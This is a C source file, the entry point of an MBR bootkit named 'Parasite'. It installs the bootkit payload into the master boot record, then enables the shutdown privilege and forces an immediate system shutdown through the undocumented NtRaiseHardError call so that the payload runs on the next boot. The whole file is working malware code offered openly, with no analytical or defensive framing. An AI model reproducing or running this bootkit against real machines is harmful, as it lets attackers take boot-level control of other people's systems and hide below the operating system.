#include "bootkit.h"

void main()
{
	STATUS_INIT;
	ULONG response;
	BOOLEAN wasEnabled;

	LOG("[Parasite] MBR Bootkit - written by Tserith\n\n");

	status = Install(BootkitStart, (UINT16)((PINT8)BootkitEnd - (PINT8)BootkitStart));
	if (!NT_SUCCESS(status))
	{
		goto fail;
	}
	
	LOG("[*] Forcing shutdown...\n");

	status = RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &wasEnabled);
	if (!NT_SUCCESS(status))
	{
		goto fail;
	}

	Sleep(2500);

	status = NtRaiseHardError(STATUS_NOT_IMPLEMENTED, 0, 0, NULL, OptionShutdownSystem, &response);
	if (!NT_SUCCESS(status))
	{
		goto fail;
	}

fail:
	if (!NT_SUCCESS(status))
	{
		if (STATUS_SPACES_EXTENDED_ERROR == status)
		{
			status = GetLastError();
		}
		LOG("[-] Error: %x\n", status);

		Sleep(4000);
	}
}